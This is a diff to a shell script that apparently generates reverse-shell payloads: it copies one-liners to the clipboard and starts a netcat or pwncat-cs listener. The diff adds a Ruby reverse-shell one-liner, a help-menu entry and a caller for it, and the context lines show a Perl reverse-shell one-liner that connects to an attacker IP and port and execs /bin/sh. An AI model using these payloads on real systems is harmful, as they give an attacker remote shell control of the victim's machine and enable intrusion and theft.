@@ -50,6 +50,10 @@ function payloadmaker(){
 	elif [ "$1" = "Perl" ]; then
 		echo "perl -e 'use Socket;\$i=$IP;\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | xclip -selection clipboard
 		listener "$2"
+	
+	elif [ "$1" = "Ruby" ]; then
+		echo "ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | xclip -selection clipboard
+		listener "$2"
 
 	else
 		echo "Invalid payload.\nReport error to RST Error Forum on Github or write to us at rst@gmail.com"
@@ -83,7 +87,7 @@ if [ "$1" == "" ]; then
 
 ##Help Menu 
 elif [ "$1" = "help" ]; then 	
-	echo -e "${yellow}Option 1:\n1. Python\n2. Bash\n3. PHP\n4. Netcat\n5. Perl\n"
+	echo -e "${yellow}Option 1:\n1. Python\n2. Bash\n3. PHP\n4. Netcat\n5. Perl\n6. Ruby\n"
 	echo -e "${yellow}Option 2:\n1. Netcat(Default)\n2. Pwncat-cs\n"
 	echo -e 'Usage: rs <language> <listener>'
 	echo -e 'Example: rs 1 2\n\t For a python payload and pwncat-cs listener.'
@@ -129,11 +133,19 @@ elif [ "$1" = 4 ]; then
 		payloadmaker Netcat pwncat-cs
 	fi
 
-##Netcat Caller
+##Perl Caller
 elif [ "$1" = 5 ]; then
 	if [ "$2" = 1 ] || [ "$2" = "" ]; then
 		payloadmaker Perl Netcat
 	elif [ "$2" = 2 ]; then
 		payloadmaker Perl pwncat-cs
+	fi
+
+##Ruby Caller
+elif [ "$1" = 6 ]; then
+	if [ "$2" = 1 ] || [ "$2" = "" ]; then
+		payloadmaker Ruby Netcat
+	elif [ "$2" = 2 ]; then
+		payloadmaker Ruby pwncat-cs
 	fi
 fi
